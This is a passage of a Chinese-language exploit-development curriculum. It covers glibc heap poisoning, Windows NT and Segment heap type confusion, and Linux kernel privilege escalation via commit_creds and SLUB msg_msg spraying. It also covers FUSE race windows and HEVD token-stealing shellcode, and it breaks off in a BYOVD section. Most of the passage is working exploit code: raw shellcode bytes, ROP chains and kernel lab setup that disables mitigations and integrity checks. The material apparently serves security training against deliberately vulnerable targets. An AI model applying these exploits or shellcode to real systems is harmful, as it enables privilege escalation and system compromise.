log.success(f'Heap base (approx): {hex(heap_base_approx)}')

# 第 3 步：分配更多块——下一个空闲块的 fd 将被混淆
alloc(0x28, b'BBBB')   # 块 B（索引 1）
free_chunk(1)
free_chunk(0)   # 双重释放：tcache 中有 B -> A
# B 被混淆的 fd = A 的地址 XOR key

# 第 4 步：对块 B 进行 UAF 写入——伪造指向目标的混淆 fd
target_addr = libc.symbols['__exit_funcs']   # 或任意写入目标
mangled     = (target_addr >> 12) ^ target_addr
write_chunk(1, p64(mangled))

# 第 5 步：两次分配到达目标
alloc(0x28, b'X'*8)    # 得到 B
alloc(0x28, p64(one_gadget) + b'\x00'*20)  # 得到 target_addr！
```

---

## 区块 6：Windows 堆利用

**时间：3-4 周 | 难度：极限**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [Windows 堆利用 第 1 部分](https://www.youtube.com/watch?v=gL45bjQvZSU) | YouTube | 2 小时 | 免费 | NT 堆内部结构、空闲链表破坏 |
| [Azeria Labs 堆利用](https://azeria-labs.com/heap-overflow-sample-case/) | 博客 | 3 小时 | 免费 | 清晰的概念讲解 |
| [Windows 10 Segment Heap 内部结构（BlackHat 2016）](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf) | PDF | 4 小时 | 免费 | 现代 Windows 堆的必读材料 |
| [HEVD 池利用](https://connormcgarr.github.io/2020/12/05/Kernel-Pool-Internals/) | 博客 | 3 小时 | 免费 | 从用户态视角看内核池 |

### NT 堆与 Segment 堆架构

```
NT 堆（经典，Windows 10 RS4 之前）：
  使用者：大多数旧式进程、cmd.exe、notepad.exe
  空闲链表：按大小组织的双向链表（ListHints，128 项）
  LFH（低碎片堆）：同一大小的分配达到 18 次以上后激活
  块头（8 字节）：
    [size:16][flags:8][smallTagIndex:8][PreviousSize:16][SegmentOffset:8][UnusedBytes:8]

Segment 堆（Windows 10 RS4+，2018 年 4 月发布）：
  使用者：Edge/Chromium、所有现代 UWP 应用、Microsoft Office、系统进程
  后端：大块分配（>= 128KB）
  大块（Large Block）：>= 520KB
  VS（可变大小）分配器：处理 512B-128KB
  LFH：处理小于 512B 的分配
  安全特性：
    头部 cookie（与每个堆的随机种子进行 XOR）
    段之间的保护页
    LFH bin 内块的随机排序

关键：在 WinDbg 中：!heap -s  ->  查找 "Segment heap enabled" 标志
```

### NT 堆——LFH 类型混淆攻击

```c
// 文件：nt_heap_lfh_confusion.c
// LFH 在相同大小的分配达到 18 次后激活。
// 不同结构体类型若分配大小相同，则共享同一个桶（bucket）。
// UAF + 受控分配 = 类型混淆。

#include <windows.h>
#include <stdio.h>

typedef struct {
    void (*callback)(void);  // 偏移 0 处的函数指针
    char data[56];           // 填充至总共 0x40
} ObjectA;

typedef struct {
    char input[8];           // 偏移 0 处由攻击者控制
    char padding[56];
} ObjectB;

int main() {
    HANDLE heap = GetProcessHeap();

    // 为 0x40 字节桶触发 LFH
    for (int i = 0; i < 20; i++) {
        void *p = HeapAlloc(heap, 0, sizeof(ObjectA));
        HeapFree(heap, 0, p);
    }

    ObjectA *victim = HeapAlloc(heap, 0, sizeof(ObjectA));
    victim->callback = (void(*)(void))0x00007ff700401234;

    HeapFree(heap, 0, victim);

    // LFH 把与 victim 相同的块给我们
    ObjectB *attacker = HeapAlloc(heap, 0, sizeof(ObjectB));

    // 将目标地址写入 ObjectB 的 input 字段（偏移 0）
    // 这与 ObjectA 的 callback 字段（同样是偏移 0）重叠
    void (*evil)(void) = (void(*)(void))0x00007ff700402020;
    memcpy(attacker->input, &evil, 8);

    // UAF：触发悬垂的 victim->callback
    victim->callback();   // 调用我们的目标函数

    return 0;
}
```

### Segment 堆 VS 分配器——类型混淆利用（缺口已补齐）

Segment 堆的 VS（可变大小）分配器处理 512B-128KB 的分配。早期路线图版本只描述了架构而没有可用的 PoC。本节补齐这一缺口。

```c
// 文件：segment_heap_vs_confusion.c
// 目标：使用 Segment 堆的进程（Edge、Office、现代 UWP）
// 技术：UAF -> 用受控的 VS 块重新分配 -> vtable 混淆
// 要求：Windows 10 RS4+ 虚拟机、WinDbg Preview

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 使用 HeapCreate 的自定义堆以保证 Segment 堆行为：
// 在 RS4+ 上，带 HEAP_NO_SERIALIZE 的 HeapCreate 默认使用 Segment 堆。

// --- 结构体定义（在 VS 分配器范围内大小相同：各 0x80 字节） ---

typedef struct VictimObj {
    void  (**vtable)(void);  // 偏移 0 处的 vtable 指针
    DWORD  refCount;
    BYTE   data[116];        // 填充至 0x80 = 总共 128 字节
} VictimObj;

typedef struct ControlObj {
    ULONG_PTR gadget_addr;   // 与偏移 0 处的 vtable 指针重叠
    BYTE      padding[120];  // 填充至 0x80 = 总共 128 字节
} ControlObj;

// 攻击者控制的函数，在 victim->vtable[0]() 被调用时执行：
void __cdecl evil_payload(void) {
    printf("[+] Code execution via Segment Heap type confusion!\n");
    // 在真实利用中：shellcode、令牌窃取、LPE 链
    system("cmd.exe");
}

// 伪造的 vtable：一个指向 evil_payload 的条目
void (*fake_vtable[1])(void) = { evil_payload };

int main(void) {
    // 创建一个使用 Segment 堆的堆（RS4+ 的默认行为）
    HANDLE heap = HeapCreate(0, 0, 0);
    if (!heap) { perror("HeapCreate"); return 1; }

    // ---- 阶段 1：喷洒以为 0x80 字节类预热 VS 分配器 --------
    // 分配 + 释放 32 次，确保 0x80 字节类的 LFH 桶已预热
    for (int i = 0; i < 32; i++) {
        void *p = HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(VictimObj));
        HeapFree(heap, 0, p);
    }

    // ---- 阶段 2：分配 victim 对象并设置其 vtable ----------------
    VictimObj *victim = (VictimObj *)HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(VictimObj));
    if (!victim) { perror("HeapAlloc victim"); return 1; }

    // 将 victim 的 vtable 指向一个合法（安全）的 vtable：
    void (*safe_vtable[1])(void) = { (void(*)(void))puts };
    victim->vtable   = safe_vtable;
    victim->refCount = 1;

    printf("[*] VictimObj at: %p\n", victim);
    printf("[*] VictimObj->vtable: %p -> %p\n", victim->vtable, victim->vtable[0]);

    // ---- 阶段 3：释放 victim——制造 UAF 条件 -------------------------
    HeapFree(heap, 0, victim);
    // victim 指针现在悬垂（保留了过期引用）
    // 在真实 UAF 缺陷中：其他代码路径仍然持有指向该块的指针。
    // VS 分配器已将该块归还到其空闲链表。

    // ---- 阶段 4：用同样大小的 ControlObj 重新分配 --------------------
    ControlObj *ctrl = (ControlObj *)HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(ControlObj));
    if (!ctrl) { perror("HeapAlloc ctrl"); return 1; }

    // Segment 堆的 VS 分配器从相同大小类中服务请求。
    // 很可能 ctrl 占据与 victim 相同的内存。
    // 在 WinDbg 中验证：'dp victim_addr' 与 'dp ctrl_addr'——地址相同。

    printf("[*] ControlObj at: %p\n", ctrl);
    printf("[*] Same memory as victim? %s\n",
           (void*)ctrl == (void*)victim ? "YES (exploit works)" : "NO (retry with more spray)");

    // ---- 阶段 5：在偏移 0 处写入伪造的 vtable 指针 ---------------------
    // ControlObj 的偏移 0（gadget_addr）与 VictimObj 的偏移 0（vtable）重叠
    ctrl->gadget_addr = (ULONG_PTR)fake_vtable;
    memset(ctrl->padding, 0xCC, sizeof(ctrl->padding));  // 其余部分用 int3 填充以便观察

    printf("[*] Forged vtable at: %p, points to: %p\n",
           fake_vtable, fake_vtable[0]);

    // ---- 阶段 6：触发 UAF——代码执行 -------------------------------
    // 应用的过期 victim 指针仍然存在。
    // 当它调用 victim->vtable[0](victim) 时，我们执行 evil_payload。
    printf("[*] Triggering UAF call on stale victim pointer...\n");
    victim->vtable[0]();   // 解引用伪造的 vtable -> evil_payload()

    HeapDestroy(heap);
    return 0;
}
```

```
在 WINDBG 中调试：
在 HeapFree(victim) 之后、HeapAlloc(ctrl) 之前：
  !heap -x <victim_addr>        ——显示已释放块的状态
  dp <victim_addr>              ——检查原始内存

在 HeapAlloc(ctrl) 之后：
  dp <ctrl_addr>                ——确认与 victim 地址相同
  dp <ctrl_addr+0>              ——偏移 0：应为我们的 fake_vtable 地址

伪造之后：
  dps <fake_vtable_addr>        ——显示 vtable 内容 -> evil_payload 指针

关于 SEGMENT 堆 COOKIE 的说明：
  VS 块头与每个堆的随机种子（即 "cookie"）进行 XOR。
  直接破坏头部需要知道种子。
  本利用完全避免破坏头部，而是针对
  对象内容（vtable 指针），而非堆元数据。
  这是首选的现代技术，因为：
  1. 它不会触发 VS 合并
  2. 它绕过头部 cookie 校验
  3. 即使 Safe Unlinking 启用也有效
```

---

## 区块 7：Linux 内核利用

**时间：4-6 周 | 难度：极限**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [Linux 内核利用 - YouTube](https://www.youtube.com/watch?v=il1wGXeKJAo) | YouTube | 3 小时 | 免费 | 模块交互与技术 |
| [pwn.college 内核利用](https://pwn.college/system-security/kernel-security/) | 平台 | 20 小时 | 免费 | 结构化，从基础开始 |
| [lkmidas 内核系列](https://lkmidas.github.io/) | 博客 | 10 小时 | 免费 | CTF 内核系列。读完所有部分。 |
| [Linux 设备驱动 LDD3](https://lwn.net/Kernel/LDD3/) | 书籍 | 30 小时 | 免费 | 理解驱动内部结构 |

### QEMU 内核实验环境搭建

```bash
# 构建一个存在漏洞的内核用于练习：
wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.tar.xz
tar -xf linux-5.15.tar.xz && cd linux-5.15

make defconfig
cat >> .config << 'EOF'
CONFIG_DEBUG_INFO=y
CONFIG_DEBUG_INFO_DWARF4=y
CONFIG_GDB_SCRIPTS=y
CONFIG_KGDB=y
CONFIG_KGDB_SERIAL_CONSOLE=y
CONFIG_RANDOMIZE_BASE=n
CONFIG_STACKPROTECTOR=n
CONFIG_SLAB=y
EOF
make -j$(nproc)

# 用 busybox 创建最小 rootfs：
wget https://busybox.net/downloads/busybox-1.35.0.tar.bz2
tar -xf busybox-1.35.0.tar.bz2 && cd busybox-1.35.0
make defconfig && make CONFIG_STATIC=y -j$(nproc) && make install

mkdir -p ../rootfs/{bin,sbin,etc,proc,sys,dev}
cp -a _install/* ../rootfs/
cat > ../rootfs/init << 'INITEOF'
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
echo "Kernel: $(uname -r)"
setsid /bin/sh -c 'exec /bin/sh </dev/ttyS0 >/dev/ttyS0 2>&1'
INITEOF
chmod +x ../rootfs/init
(cd ../rootfs && find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz)

# 带 GDB stub 启动 QEMU：
qemu-system-x86_64 \
    -kernel arch/x86/boot/bzImage \
    -initrd rootfs.cpio.gz \
    -append "console=ttyS0 nokaslr nopti nosmap nosmep" \
    -nographic \
    -s -S

# 连接 GDB：
gdb vmlinux
target remote :1234
c
b commit_creds
```

### 内核利用——commit_creds 模式

```c
// 文件：kernel_exploit.c
// 模式：内核 UAF/溢出 -> 内核代码执行
//          -> commit_creds(prepare_kernel_cred(NULL)) -> SYSTEM 权限

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

size_t user_rip, user_rsp, user_cs, user_rflags, user_ss;

void post_exploit();

void save_state() {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushfq\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        : : "memory"
    );
    user_rip = (size_t)post_exploit;
}

#define COMMIT_CREDS          0xffffffff81081bc0
#define PREPARE_KERNEL_CRED   0xffffffff81081e80

typedef void* (*prepare_kernel_cred_t)(void*);
typedef int   (*commit_creds_t)(void*);

void kernel_payload() {
    prepare_kernel_cred_t prepare = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED;
    commit_creds_t commit         = (commit_creds_t)COMMIT_CREDS;
    commit(prepare(NULL));
}

void post_exploit() {
    if (getuid() == 0) {
        puts("[+] Got root!");
        system("/bin/sh");
    } else {
        puts("[-] Failed to escalate");
    }
    exit(0);
}

int main() {
    int fd = open("/dev/vuln_module", O_RDWR);
    if (fd < 0) { perror("open"); exit(1); }

    save_state();

    size_t payload[64] = {0};
    payload[0] = (size_t)kernel_payload;
    write(fd, payload, sizeof(payload));

    close(fd);
    return 0;
}
```

### 内核缓解措施与绕过

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/4._Kernel_Mitigations_and_Bypasses.png" alt="Kernel Mitigations and Bypasses" width="950"/>

</td></tr></table>
</div>


```c
// 从内核 ROP 返回到用户态的 KPTI 感知方式：
unsigned long kpti_trampoline = KASLR_BASE + 0x800e26;

size_t rop_chain[] = {
    // ... commit_creds gadget ...
    kpti_trampoline,
    0,              // 填充（trampoline 会弹出它）
    0,              // 填充
    (size_t)post_exploit,   // rip
    user_cs,
    user_rflags,
    user_rsp,
    user_ss,
};
```

---

## 区块 8：Linux 内核 SLUB/Slab 利用

**时间：2-3 周 | 难度：极限**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [CVE-2022-0995 分析](https://www.openwall.com/lists/oss-security/2022/03/29/4) | 分析文章 | 3 小时 | 免费 | 现代内核上的真实 SLUB 利用 |
| [内核堆风水 SLUB](https://duasynt.com/blog/linux-kernel-heap-feng-shui-slub) | 博客 | 4 小时 | 免费 | 针对 SLUB 的风水技术 |
| [io_uring 堆布局](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html) | 博客 | 3 小时 | 免费 | 现代堆布局原语 |
| [kernelpop](https://github.com/spencerdodd/kernelpop) | GitHub | 2 小时 | 免费 | 真实 CVE 模式参考 |

### SLUB 分配器内部结构

```
自内核 2.6.23 起，SLUB 分配器就是 Linux 内核的默认内存分配器。

SLUB 架构：
  相同大小的对象共享一个 "slab"（一个或多个页）。
  每个大小类都有自己的每 CPU 缓存（kmem_cache_cpu）。
  每 CPU 空闲链表：通过对象自身串联的单向链表。

空闲对象结构：
  空闲对象在偏移 0 处包含一个前向指针。
  在内核 >= 6.1 上：指针会与每个 slab 的随机种子进行混淆
  （类似 glibc 中的 Safe-Linking）。

关键洞见：结构体类型不同但大小相同的对象共享同一个 slab。
这是跨缓存攻击与类型混淆攻击的基础。
```

### 使用 msg_msg 喷洒的跨缓存攻击

```c
// 文件：slub_crosscache.c
// 技术：使用 msg_msg 喷洒的 SLUB 跨缓存 UAF
// 目标：带 kmalloc(96) 分配的自定义存在漏洞的内核模块

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <string.h>

#define VULN_DEVICE    "/dev/vuln_module"
#define IOCTL_ALLOC    0x1001
#define IOCTL_FREE     0x1002
#define IOCTL_TRIGGER  0x1003

#define TARGET_SIZE    96     // 必须与存在漏洞的模块中的 kmalloc 大小匹配
#define MSG_SIZE       (TARGET_SIZE - sizeof(long))  // mtype 为 sizeof(long)

void kernel_payload();   // 前向声明

int main(void) {
    int fd = open(VULN_DEVICE, O_RDWR);
    if (fd < 0) { perror("open"); exit(1); }

    // 阶段 1：喷洒——用 msg_msg 对象填满 kmem_cache-96
    int msqids[256];
    struct {
        long mtype;
        char mtext[MSG_SIZE];
    } spray_msg;

    spray_msg.mtype = 1;
    size_t fake_fn_ptr = (size_t)kernel_payload;
    memcpy(spray_msg.mtext, &fake_fn_ptr, 8);
    memset(spray_msg.mtext + 8, 0xBB, MSG_SIZE - 8);

    for (int i = 0; i < 256; i++) {
        msqids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msqids[i] < 0) { perror("msgget"); exit(1); }
        msgsnd(msqids[i], &spray_msg, MSG_SIZE, 0);
    }

    // 阶段 2：通过存在漏洞的模块分配目标结构体
    ioctl(fd, IOCTL_ALLOC, TARGET_SIZE);

    // 阶段 3：释放目标结构体——制造 UAF
    ioctl(fd, IOCTL_FREE, 0);

    // 阶段 4：压力填充已释放的槽位
    int msqid_win = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    msgsnd(msqid_win, &spray_msg, MSG_SIZE, 0);

    // 阶段 5：触发 UAF
    ioctl(fd, IOCTL_TRIGGER, 0);

    if (getuid() == 0) {
        puts("[+] Root shell via SLUB cross-cache UAF!");
        system("/bin/sh");
    }

    close(fd);
    return 0;
}
```

### 弹性对象技术（缺口已补齐）

弹性对象技术使用可在分配时调整大小的 `msg_msg` 扩展消息，以桥接不同的大小类。它允许攻击者通过调整喷洒对象的大小来触达位于不同 kmem_cache 中的目标。

```c
// 文件：elastic_objects.c
// 技术：用 msg_msg 弹性尺寸桥接大小类
//
// 理论：
// msg_msg 头部是固定的（x86-64 上为 48 字节）。
// 消息文本紧随其后。
// 总分配大小：sizeof(msg_msg) + msg_text_size
// 通过选择 msg_text_size，你可以控制 msg 落入哪个 kmem_cache。
//
// 示例：目标结构体为 192 字节（kmem_cache-192）。
//          sizeof(msg_msg) = 48 字节。
//          我们需要：48 + text_size = 192
//          所以：text_size = 144 字节
//
// 这样你就可以通过选择合适的 msg_text 大小，向任意 slab 缓存喷洒。
//
// 用于大目标的扩展 msg_msg（SEG_MSG）：
// 如果 target > 4096 - sizeof(msg_msg)，消息体会跨越多个
// msg_msgseg 结构体。第一个 seg 位于 kmem_cache，其余位于页分配器。
// 这将攻击面扩展到大型内核对象。

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/msg.h>
#include <unistd.h>

// msg_msg 内部结构（来自内核源码 include/linux/msg.h）：
// struct msg_msg {
//     struct list_head  m_list;   // 16 字节（两个指针）
//     long              m_type;   //  8 字节
//     size_t            m_ts;     //  8 字节（消息文本大小）
//     struct msg_msgseg *next;    //  8 字节
//     void              *security;//  8 字节
// };                              // = 总共 48 字节
#define MSG_MSG_HDR_SIZE  48

// 构建一条喷洒消息，使其落入给定目标大小对应的确切 kmem_cache：
int spray_elastic(int msqid, size_t target_kmalloc_size,
                  void *payload, size_t payload_size)
{
    // 计算文本大小，以落入 target_kmalloc_size 缓存：
    size_t text_size = target_kmalloc_size - MSG_MSG_HDR_SIZE;

    // 最小文本：1 字节（msg_ts 必须 > 0）
    if (text_size < payload_size || text_size < 1) {
        fprintf(stderr, "Target size %zu too small for msg_msg\n", target_kmalloc_size);
        return -1;
    }

    // 构建消息：载荷放在最前面（与目标结构体中有意义的字段重叠）
    struct msgbuf {
        long mtype;
        char mtext[4096];   // 最大单段消息
    } msg;

    msg.mtype = 1;
    memset(msg.mtext, 0x41, text_size);

    if (payload && payload_size > 0) {
        memcpy(msg.mtext, payload, payload_size);
    }

    if (msgsnd(msqid, &msg, text_size, 0) < 0) {
        perror("msgsnd");
        return -1;
    }

    printf("[*] Sprayed msg_msg: text_size=%zu -> kmem_cache-%zu\n",
           text_size, target_kmalloc_size);
    return 0;
}

// 示例：喷洒以触达 kmem_cache-192（目标结构体为 192 字节）
int main(void) {
    size_t target_struct_size = 192;   // 改为与你的目标匹配

    // 消息文本偏移 0 处的载荷会与目标结构体的
    // 偏移 MSG_MSG_HDR_SIZE 重叠（如果目标结构体有意义字段在该偏移，
    // 请相应调整）。
    //
    // 对于目标结构体偏移 8 处的函数指针：
    // 填充 = 8 - MSG_MSG_HDR_SIZE？不——msg_msg 头部在文本之前。
    // 文本起始于 (target_struct_base + MSG_MSG_HDR_SIZE)。
    // 因此要覆盖目标结构体的偏移 56：
    //   文本偏移 = 56 - 48 = 消息文本中的 8 字节处。
    size_t fn_ptr_offset_in_target = 56;
    size_t text_offset = fn_ptr_offset_in_target - MSG_MSG_HDR_SIZE;

    size_t fake_fn = (size_t)0xdeadbeefcafe1234;  // 替换为真实的载荷函数
    char payload[64] = {0};
    memcpy(payload + text_offset, &fake_fn, 8);

    // 创建 512 个队列以获得广泛的喷洒覆盖：
    int msqids[512];
    for (int i = 0; i < 512; i++) {
        msqids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msqids[i] < 0) { perror("msgget"); exit(1); }
        spray_elastic(msqids[i], target_struct_size, payload, sizeof(payload));
    }

    printf("[*] Spray complete. %d msg_msg objects in kmem_cache-%zu\n",
           512, target_struct_size);
    printf("[*] Now trigger UAF on the target struct to get code execution.\n");

    return 0;
}
```

### userfaultfd 与 FUSE 竞争窗口（缺口已补齐——覆盖内核 5.11+）

`userfaultfd` 对非特权用户的限制始于内核 5.11+。对于现代内核，FUSE 提供了等效的受控延迟。

```c
// 文件：race_window_fuse.c
// 目的：在内核 5.11+ 中创建受控竞争窗口（该版本已禁用非特权
//          userfaultfd），使用 FUSE 文件系统操作。
//
// 工作原理：
// 挂载 FUSE 文件系统让你可以控制内核对该文件系统的操作
// 何时完成。当内核调用你的 FUSE 处理程序（在用户态）时，
// 你可以任意延迟响应——从而创建与 userfaultfd 通过缺页处理
// 所提供的相同的竞争窗口。
//
// 用例：需要两条内核代码路径交错执行的竞争条件利用：
//   路径 A：内核分配对象，访问 FUSE 支持的文件（在此处停顿）
//   路径 B：我们在窗口内释放对象并喷洒
//   解决：我们完成 FUSE 操作，路径 A 带着被破坏的状态继续。
//
// 环境要求：
//   - 支持 FUSE 的 Linux：sudo apt install fuse libfuse-dev
//   - 对攻击者控制路径执行文件操作的内核模块或 CVE

#define FUSE_USE_VERSION 31
#include <fuse3/fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>

// 竞争窗口状态：
static volatile int race_window_open = 0;
static volatile int race_triggered   = 0;

// 当内核读取触发文件时调用——我们在此处停顿：
static int fuse_read_trigger(const char *path, char *buf, size_t size,
                             off_t offset, struct fuse_file_info *fi)
{
    (void)fi;

    if (strcmp(path, "/trigger") == 0) {
        // 发出信号：我们现在已进入竞争窗口：
        race_window_open = 1;
        printf("[FUSE] Race window OPEN -- spray now\n");

        // 等待喷洒完成：
        while (!race_triggered) {
            usleep(100);   // 紧凑轮询
        }
        race_window_open = 0;
        printf("[FUSE] Race window CLOSED -- releasing kernel\n");

        // 提供最小有效数据，使内核操作成功：
        if (offset == 0 && size >= 1) {
            buf[0] = 'X';
            return 1;
        }
        return 0;
    }

    return -ENOENT;
}

static int fuse_getattr_trigger(const char *path, struct stat *stbuf,
                                struct fuse_file_info *fi)
{
    (void)fi;
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {
        stbuf->st_mode  = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
        return 0;
    }
    if (strcmp(path, "/trigger") == 0) {
        stbuf->st_mode  = S_IFREG | 0444;
        stbuf->st_nlink = 1;
        stbuf->st_size  = 1;
        return 0;
    }
    return -ENOENT;
}

static struct fuse_operations fuse_ops = {
    .getattr = fuse_getattr_trigger,
    .read    = fuse_read_trigger,
};

// 攻击者线程：等待竞争窗口然后喷洒：
void *spray_thread(void *arg) {
    while (!race_window_open) usleep(10);
    printf("[SPRAY] Window open -- executing spray\n");

    // ---- 在此处插入你的喷洒代码 ----
    // 示例：将 msg_msg 对象喷洒到已释放的 kmem_cache 槽位
    // spray_elastic(msqids[i], target_size, payload, sizeof(payload));
    // --------------------------------------

    printf("[SPRAY] Spray complete -- closing window\n");
    race_triggered = 1;
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <mountpoint>\n", argv[0]);
        fprintf(stderr, "  mkdir /tmp/fusemnt && %s /tmp/fusemnt\n", argv[0]);
        return 1;
    }

    // 启动喷洒线程（等待竞争窗口）：
    pthread_t thr;
    pthread_create(&thr, NULL, spray_thread, NULL);

    // 挂载 FUSE 文件系统（阻塞直到卸载或出错）：
    printf("[*] Mounting FUSE at %s\n", argv[1]);
    printf("[*] Trigger race by: cat %s/trigger\n", argv[1]);
    printf("[*] Or have kernel code path read /trigger via your exploit\n");

    char *fuse_argv[] = { argv[0], argv[1], "-f", NULL };
    int   fuse_argc   = 3;
    return fuse_main(fuse_argc, fuse_argv, &fuse_ops, NULL);
}
```

```bash
# 构建：
gcc -o race_fuse race_window_fuse.c $(pkg-config --cflags --libs fuse3) -lpthread

# 使用：
mkdir /tmp/fusemnt
./race_fuse /tmp/fusemnt &

# 从你的利用程序：触发内核读取 /tmp/fusemnt/trigger
# spray_thread 会在竞争窗口内自动触发
# 然后 FUSE 处理程序释放内核
fusermount3 -u /tmp/fusemnt   # 清理
```

---

## 区块 9：Windows 内核利用

**时间：4-6 周 | 难度：极限**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [HEVD - HackSys 极端易受攻击驱动](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | GitHub | 30 小时 | 免费 | Windows 内核训练的标准靶场 |
| [Connor McGarr - 内核利用](https://connormcgarr.github.io/) | 博客 | 8 小时 | 免费 | 优秀的现代技术分析 |
| [Windows 内核利用工作坊](https://github.com/rootkits-xyz/Windows-Kernel-Exploits) | GitHub | 10 小时 | 免费 | 带分析的利用合集 |
| [Alex Ionescu - Windows 内部原理](https://www.youtube.com/watch?v=dhjvLEHiGBM) | YouTube | 3 小时 | 免费 | 架构背景。利用之前先看。 |

### WinDbg 内核调试环境搭建

```
环境搭建：两台 Windows 虚拟机
  VM1（调试器）：运行 WinDbg Preview
  VM2（目标机）：运行 HEVD 驱动

VM2（目标机）——以管理员身份运行：
  bcdedit /debug on
  bcdedit /dbgsettings net hostip:<VM1_IP> port:50000 key:1.2.3.4
  bcdedit /set testsigning on
  bcdedit /set nointegritychecks on
  重启 VM2

VM1（调试器）：
  WinDbg Preview -> File -> Attach to Kernel -> Net 选项卡
  hostip: VM2 的 IP | port: 50000 | key: 1.2.3.4
```

```
WinDbg 内核常用命令：
  g                          继续执行
  Ctrl+Break                 中断进入调试器

  lm m HEVD                  显示 HEVD.sys 基址
  !analyze -v                分析崩溃/蓝屏

  dt nt!_EPROCESS            显示 EPROCESS 结构布局
  dt nt!_EPROCESS <addr>     检查特定进程
  !process 0 0               列出所有进程

  # 令牌偏移（Windows 10 22H2——务必用 dt nt!_EPROCESS 在你的构建上核实）：
  # UniqueProcessId:    0x440
  # ActiveProcessLinks: 0x448
  # Token:              0x4B8

  dd <addr>                  显示 DWORD
  dq <addr>                  显示 QWORD
  u <addr>                   反汇编
  bp nt!NtCreateFile         在内核函数上下断点
  ba w8 <addr>               对 8 字节写入设置硬件断点
```

### HEVD 栈溢出——令牌窃取

```python
# 文件：hevd_stack_overflow.py
import ctypes
import subprocess
from ctypes import windll, wintypes

GENERIC_READ          = 0x80000000
GENERIC_WRITE         = 0x40000000
OPEN_EXISTING         = 3
FILE_ATTRIBUTE_NORMAL = 0x80
IOCTL_STACK_OVERFLOW  = 0x222003

device = windll.kernel32.CreateFileW(
    "\\\\.\\HackSysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE,
    0, None, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, None
)
assert device != -1, f"CreateFile failed: {windll.kernel32.GetLastError()}"
print(f"[+] Device handle: {hex(device)}")

# Windows 10 22H2 的 EPROCESS 偏移——务必用 WinDbg dt nt!_EPROCESS 核实
EPROCESS_UNIQUEPID_OFFSET   = 0x440
EPROCESS_ACTIVELINKS_OFFSET = 0x448
EPROCESS_TOKEN_OFFSET       = 0x4B8

token_steal_shellcode = bytearray([
    # mov rax, gs:[0x188]  -> KTHREAD
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
    # mov rax, [rax+0xB8]  -> EPROCESS
    0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
    # mov rcx, rax         -> 保存当前进程
    0x48, 0x89, 0xC1,

    # 遍历 ActiveProcessLinks 以查找 System（PID=4）：
    # loop: mov rax, [rax+0x448]  -> Flink
    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,
    # sub rax, 0x448  -> 回到 EPROCESS 基址
    0x48, 0x2D, 0x48, 0x04, 0x00, 0x00,
    # cmp qword [rax+0x440], 4  -> PID == 4？
    0x48, 0x83, 0xB8, 0x40, 0x04, 0x00, 0x00, 0x04,
    # jne loop
    0x75, 0xEB,

    # 将 System 的 Token 复制到当前进程：
    # mov rax, [rax+0x4B8]  -> System 的 Token
    0x48, 0x8B, 0x80, 0xB8, 0x04, 0x00, 0x00,
    # mov [rcx+0x4B8], rax  -> 设置当前 Token
    0x48, 0x89, 0x81, 0xB8, 0x04, 0x00, 0x00,

    # 返回 STATUS_SUCCESS：
    0x48, 0x31, 0xC0,    # xor rax, rax
    0xC3                 # ret
])

sc_size = len(token_steal_shellcode)
sc_addr = windll.kernel32.VirtualAlloc(
    None, sc_size, 0x3000, 0x40  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
ctypes.memmove(sc_addr, bytes(token_steal_shellcode), sc_size)
print(f"[+] Shellcode at: {hex(sc_addr)}")

OFFSET_TO_RIP = 2072   # 512 字节缓冲区 + 1560 填充——用 WinDbg 核实

payload  = b'A' * OFFSET_TO_RIP
payload += ctypes.c_uint64(sc_addr).value.to_bytes(8, 'little')

buf            = ctypes.create_string_buffer(payload)
bytes_returned = wintypes.DWORD()

windll.kernel32.DeviceIoControl(
    device, IOCTL_STACK_OVERFLOW,
    buf, len(payload),
    None, 0,
    ctypes.byref(bytes_returned),
    None
)

proc = subprocess.Popen(['cmd.exe'], creationflags=0x10)
proc.wait()
```

### BYOVD——自带易受攻击驱动

```
BYOVD（Bring Your Own Vulnerable Driver，自带易受攻击驱动）：
  加载一个合法签名但存在漏洞的驱动。
  利用其 IOCTL 漏洞实现任意内核读/写。
